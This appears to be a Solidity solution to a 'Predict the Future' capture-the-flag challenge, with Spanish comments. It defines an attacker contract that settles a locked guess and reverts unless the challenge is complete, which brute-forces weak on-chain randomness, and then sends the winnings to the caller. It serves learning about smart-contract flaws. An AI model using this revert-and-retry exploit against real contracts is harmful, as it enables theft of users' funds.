// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IPredictTheFuture{ //Declaro la interfaz del contrato posta para usar sus métodos en mi contrato atacante.
  function isComplete() external view returns (bool);
  function lockInGuess(uint8 n) external payable;
  function settle() external;
}

contract PredictTheFutureAttacker{
  IPredictTheFuture public predictContract;

  constructor (address _predictAddress) {
    predictContract = IPredictTheFuture(_predictAddress); //Con esta línea puedo crear una instancia del contrato víctima vinculada al contrato ya deployado (El que se crea cuando das click en "deploy" o "Begin Challenge")
  }

  function lockInGuess(uint8 n) external payable{ //Este método no es el que más nos interesa. Le vamos a lockear cualquier número del 0 al 9 sin importarnos mucho.
    predictContract.lockInGuess{value: 1 ether}(n);
  }
  
  function attack() external payable {
    predictContract.settle();

    //Esta línea es la clave del challenge. Es necesario comprender que si una transacción no satisface el require, la misma es revertida sin alterar estados en la blockchain.    
    require(predictContract.isComplete(), "TODAVIA INTENTANDO RESOLVER CHALLENGE");
  
    payable(tx.origin).transfer(address(this).balance);
    console.log("SE TE DEVOLVIO LA GUITA SOCIO!"); //console.log de hardhat no acepta las tildes (DEVOLVIÓ), no es que soy un burro :P
  }

  receive() external payable {}
}